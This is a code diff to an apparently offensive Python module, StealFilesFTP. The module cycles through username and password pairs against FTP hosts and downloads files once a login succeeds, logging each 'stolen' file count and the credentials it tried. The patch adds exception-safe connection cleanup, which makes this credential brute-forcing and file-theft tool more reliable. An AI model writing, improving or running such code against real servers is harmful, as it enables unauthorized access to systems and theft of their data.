@@ -38,8 +38,9 @@ class StealFilesFTP:
         """
         Establish an FTP connection.
         """
+        # FTP-1: track the connection so it can be closed on exception.
+        ftp = FTP()
         try:
-            ftp = FTP()
             ftp.connect(ip, 21)
             ftp.login(user=username, passwd=password)
             self.ftp_connected = True
@@ -47,6 +48,11 @@ class StealFilesFTP:
             return ftp
         except Exception as e:
             logger.error(f"FTP connection error for {ip} with user '{username}' and password '{password}': {e}")
+            try:
+                if ftp.sock is not None:
+                    ftp.close()
+            except Exception:
+                pass
             return None
 
     def find_files(self, ftp, dir_path):
@@ -157,6 +163,8 @@ class StealFilesFTP:
                 for username, password in credentials:
                     if self.stop_execution:
                         break
+                    # FTP-1: track conn so it's closed in finally even on exception.
+                    ftp = None
                     try:
                         logger.info(f"Trying credential {username}:{password} for {ip}")
                         ftp = self.connect_ftp(ip, username, password)
@@ -172,12 +180,21 @@ class StealFilesFTP:
                                 success = True
                                 countfiles = len(remote_files)
                                 logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} with user '{username}'")
-                            ftp.quit()
                             if success:
                                 timer.cancel()  # Cancel the timer if the operation is successful
                                 break  # Exit the loop as we have found valid credentials
                     except Exception as e:
                         logger.error(f"Error stealing files from {ip} with user '{username}': {e}")
+                    finally:
+                        if ftp is not None:
+                            try:
+                                ftp.quit()
+                            except Exception:
+                                try:
+                                    if ftp.sock is not None:
+                                        ftp.close()
+                                except Exception:
+                                    pass
 
                 # Ensure the action is marked as failed if no files were found
                 if not success:
